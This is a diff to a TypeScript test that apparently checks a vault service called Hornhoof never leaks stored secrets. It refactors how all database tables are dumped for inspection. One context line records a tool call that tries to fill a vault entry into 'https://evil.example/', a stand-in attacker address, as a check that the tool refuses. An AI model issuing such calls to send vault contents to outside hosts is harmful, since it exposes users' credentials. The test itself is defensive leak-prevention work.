@@ -56,11 +56,10 @@ describe('no vault value leaves Hornhoof', () => {
     keep('tool refused', JSON.stringify(await client.callTool({ name: 'vault_fill', arguments: { entry: 'Leak check', target: 'browser', address: 'https://evil.example/' } })));
     keep('tool list again', JSON.stringify(await client.callTool({ name: 'vault_entries', arguments: {} })));
 
-    const tables = await c.db.execute<{ table_name: string }>(sql`SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE'`);
-    for (const { table_name: table } of tables.rows) {
-      const rows = await c.db.execute(sql.raw(`SELECT * FROM "${table}"`));
-      keep(`table ${table}`, JSON.stringify(rows.rows));
-    }
+    const rowsOf = async <T>(query: ReturnType<typeof sql>) => ((await c.db.execute(query)) as unknown as { rows: T[] }).rows;
+    const tables = await rowsOf<{ table_name: string }>(sql`SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE'`);
+    expect(tables.map(t => t.table_name)).toEqual(expect.arrayContaining(['vault_entries', 'vault_log', 'task_events', 'jobs']));
+    for (const { table_name: table } of tables) keep(`table ${table}`, JSON.stringify(await rowsOf(sql.raw(`SELECT * FROM "${table}"`))));
     keep('server log', lines.join(''));
 
     expect(seen.length).toBeGreaterThan(20);
